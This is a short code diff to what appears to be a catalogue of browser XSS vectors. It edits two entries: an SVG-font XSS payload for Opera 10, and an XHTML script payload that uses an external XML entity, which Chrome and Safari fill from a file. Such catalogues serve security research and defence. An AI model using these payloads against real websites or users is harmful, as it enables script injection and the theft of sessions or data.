@@ -1494,7 +1494,7 @@ var items =
             'cs' : 'XSS u?itim SVF font? v Opera 10',
             'de' : ''
         },
-        'data'       : '<?xml version="1.0" standalone="no"?><html xmlns="http://www.w3.org/1999/xhtml"><head><style type="text/css">@font-face {font-family: y; src: url("%svg_front_path%#x") format("svg");} body {font: 100px "y";}</style></head><body>Hello</body></html>',
+        'data'       : '<?xml version="1.0" standalone="no"?>\r\n<html xmlns="http://www.w3.org/1999/xhtml">\r\n<head>\r\n<style type="text/css">\r\n@font-face {font-family: y; src: url("%svg_font_path%#x") format("svg");} body {font: 100px "y";}\r\n</style>\r\n</head>\r\n<body>Hello</body>\r\n</html>',
         'attachment' : {
             'required_mime' : 'image/svg+xml',
             'crossdomain'    : '0',            
@@ -2237,7 +2237,7 @@ var items =
             'crossdomain'    : '0',            
             'path'          : '',
             'name'          : '',
-            'raw'           : '<script xmlns="http://www.w3.org/1999/xhtml">%js_alert%</script>'
+            'raw'           : '<script xmlns="http://www.w3.org/1999/xhtml">&x;</script>'
         },
         'description': {
             'en' : 'Chrome and Safari allow using external XML entities to reference payload for an entity. The example shows that the entity &x; is now being filled with the content of the given file. The document must be delivered as XML or XHTML.',
